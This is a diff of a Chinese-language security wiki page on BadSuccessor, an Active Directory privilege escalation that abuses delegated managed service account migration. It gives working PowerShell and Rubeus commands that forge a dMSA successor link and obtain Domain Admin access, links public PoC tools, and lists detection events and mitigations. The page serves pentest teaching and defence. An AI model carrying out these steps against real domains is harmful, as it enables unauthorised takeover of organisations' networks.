@@ -1,39 +1,39 @@
-# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse
+# BadSuccessor：通过 Delegated MSA Migration Abuse 进行 Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 概述
 
-委派的托管服务账户 (**dMSA**) 是 **gMSA** 的下一代继任者，随 Windows Server 2025 发布。 合法的迁移工作流程允许管理员用 dMSA 替换 *旧* 账户（用户、计算机或服务账户），同时透明地保留权限。 该工作流程通过 PowerShell cmdlets 公开，例如 `Start-ADServiceAccountMigration` 和 `Complete-ADServiceAccountMigration`，并依赖于 **dMSA 对象** 的两个 LDAP 属性：
+Delegated Managed Service Accounts（**dMSA**）是随 Windows Server 2025 发布的新一代 **gMSA** successor。合法的 migration workflow 允许管理员使用 dMSA 替换一个*旧* account（user、computer 或 service account），同时透明地保留其 permissions。该 workflow 通过 `Start-ADServiceAccountMigration` 和 `Complete-ADServiceAccountMigration` 等 PowerShell cmdlets 提供，并依赖 **dMSA object** 的两个 LDAP attributes：
 
-* **`msDS-ManagedAccountPrecededByLink`** – *DN 链接* 到被取代的（旧）账户。
-* **`msDS-DelegatedMSAState`**       – 迁移状态 (`0` = 无, `1` = 进行中, `2` = *已完成*)。
+* **`msDS-ManagedAccountPrecededByLink`** – 指向被替换（旧）account 的 *DN link*。
+* **`msDS-DelegatedMSAState`**       – migration state（`0` = none，`1` = in-progress，`2` = *completed*）。<sup>[[1]](#references)</sup>
 
-如果攻击者可以在 OU 中创建 **任何** dMSA 并直接操纵这两个属性，LSASS 和 KDC 将把 dMSA 视为链接账户的 *继任者*。 当攻击者随后以 dMSA 身份进行身份验证时，**他们继承了链接账户的所有权限** – 如果管理员账户被链接，则最高可达 **域管理员**。
+如果 attacker 能够在一个 OU 中创建**任意** dMSA，并直接操纵这两个 attributes，LSASS 和 KDC 就会将该 dMSA 视为所链接 account 的 *successor*。当 attacker 随后以该 dMSA 进行 authentication 时，**他们会继承所链接 account 的全部 privileges**——如果链接的是 Administrator account，最高可达 **Domain Admin**。<sup>[[1]](#references)</sup>
 
-该技术在 2025 年被 Unit 42 称为 **BadSuccessor**。 在撰写时 **没有安全补丁** 可用；只有加强 OU 权限可以缓解此问题。
+该 technique 于 2025 年由 Unit 42 命名为 **BadSuccessor**。截至本文撰写时，**尚无 security patch** 可用；只有强化 OU permissions 才能缓解此问题。<sup>[[1]](#references)[[2]](#references)</sup>
 
-### 攻击前提条件
+### Attack prerequisites
 
-1. 一个 *被允许* 在 **组织单位 (OU)** 内创建对象的账户 *并且* 至少具有以下之一：
-* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 对象类
-* `Create Child` → **`All Objects`** （通用创建）
-2. 与 LDAP 和 Kerberos 的网络连接（标准域加入场景 / 远程攻击）。
+1. 一个被*允许*在**Organizational Unit（OU）**内创建 objects 的 account，并且至少具有以下权限之一：
+* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
+* `Create Child` → **`All Objects`**（generic create）
+2. 连接 LDAP 和 Kerberos 的网络 connectivity（标准 domain joined 场景 / remote attack）。<sup>[[1]](#references)</sup>
 
-## 枚举易受攻击的 OU
+## 枚举 Vulnerable OUs
 
-Unit 42 发布了一个 PowerShell 辅助脚本，解析每个 OU 的安全描述符并突出显示所需的 ACEs：
+Unit 42 发布了一个 PowerShell helper script，用于解析每个 OU 的 security descriptors，并突出显示所需的 ACEs：<sup>[[1]](#references)</sup>
 ```powershell
 Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
 ```
-在底层，脚本运行一个分页的 LDAP 搜索 `(objectClass=organizationalUnit)` 并检查每个 `nTSecurityDescriptor` 是否具有
+在底层，该脚本会对 `(objectClass=organizationalUnit)` 执行分页 LDAP 搜索，并检查每个 `nTSecurityDescriptor` 是否包含
 
 * `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
-* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (对象类 *msDS-DelegatedManagedServiceAccount*)
+* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（对象类 *msDS-DelegatedManagedServiceAccount*）
 
-## 利用步骤
+## Exploitation Steps
 
-一旦识别出可写的 OU，攻击只需 3 次 LDAP 写入：
+识别出可写 OU 后，该攻击只需执行 3 次 LDAP 写入：<sup>[[1]](#references)</sup>
 ```powershell
 # 1. Create a new delegated MSA inside the delegated OU
 New-ADServiceAccount -Name attacker_dMSA \
@@ -47,17 +47,17 @@ Set-ADServiceAccount attacker_dMSA -Add \
 # 3. Mark the migration as *completed*
 Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
 ```
-在复制后，攻击者可以简单地 **logon** 为 `attacker_dMSA$` 或请求 Kerberos TGT – Windows 将构建 *superseded* 账户的令牌。
+复制完成后，攻击者可以直接以 `attacker_dMSA$` **logon**，或请求 Kerberos TGT —— Windows 将构建*被替代*账户的令牌。<sup>[[1]](#references)</sup>
 
 ### 自动化
 
-几个公共 PoC 包装了整个工作流程，包括密码检索和票证管理：
+多个公开的 PoC 封装了包括密码检索和 ticket 管理在内的完整工作流：
 
-* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
-* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
-* NetExec 模块 – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
+* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
+* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
+* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>
 
-### 后期利用
+### Post-Exploitation
 ```powershell
 # Request a TGT for the dMSA and inject it (Rubeus)
 Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
@@ -66,37 +66,38 @@ Rubeus ptt /ticket:<Base64TGT>
 # Access Domain Admin resources
 dir \\DC01\C$
 ```
-## 检测与狩猎
+## Detection & Hunting
 
-在组织单位（OUs）上启用**对象审计**，并监控以下Windows安全事件：
+在 OU 上启用 **Object Auditing**，并监控以下 Windows Security Events：<sup>[[1]](#references)[[2]](#references)</sup>
 
-* **5137** – 创建**dMSA**对象
-* **5136** – 修改**`msDS-ManagedAccountPrecededByLink`**
-* **4662** – 特定属性更改
+* **5137** – 创建 **dMSA** 对象
+* **5136** – 修改 **`msDS-ManagedAccountPrecededByLink`**
+* **4662** – 特定属性变更
 * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
 * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
-* **2946** – dMSA的TGT签发
+* **2946** – 为 dMSA 签发 TGT
 
-关联`4662`（属性修改）、`4741`（计算机/服务账户创建）和`4624`（后续登录）可以快速突出BadSuccessor活动。像**XSIAM**这样的XDR解决方案提供现成的查询（见参考文献）。
+关联 `4662`（属性修改）、`4741`（创建计算机/服务账户）和 `4624`（后续登录）可以快速识别 BadSuccessor 活动。XDR 解决方案（例如 **XSIAM**）提供开箱即用的查询（参见 references）。<sup>[[2]](#references)</sup>
 
-## 缓解措施
+## Mitigation
 
-* 应用**最小权限**原则 – 仅将*服务账户*管理委派给受信任的角色。
-* 从不明确需要的OUs中移除`Create Child` / `msDS-DelegatedManagedServiceAccount`。
-* 监控上述事件ID，并对创建或编辑dMSA的*非Tier-0*身份发出警报。
+* 遵循 **least privilege** 原则——仅将 *Service Account* 管理权限委派给可信角色。
+* 从不明确需要这些权限的 OU 中移除 `Create Child` / `msDS-DelegatedManagedServiceAccount`。
+* 监控上述事件 ID，并对创建或编辑 dMSA 的 *non-Tier-0* 身份发出告警。
 
-## 另见
+## See also
 
 
 {{#ref}}
 golden-dmsa-gmsa.md
 {{#endref}}
 
-## 参考文献
+## References
 
-- [Unit42 – 当好账户变坏：利用委派的托管服务账户](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
-- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
-- [BadSuccessor.ps1 – 渗透测试工具集合](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
-- [NetExec BadSuccessor模块](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
+- [1] [BadSuccessor：滥用 dMSA 在 Active Directory 中提升权限 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- [2] [Unit42 – 当良好账户变坏：利用 Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
+- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
+- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
+- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
 
 {{#include ../../banners/hacktricks-training.md}}
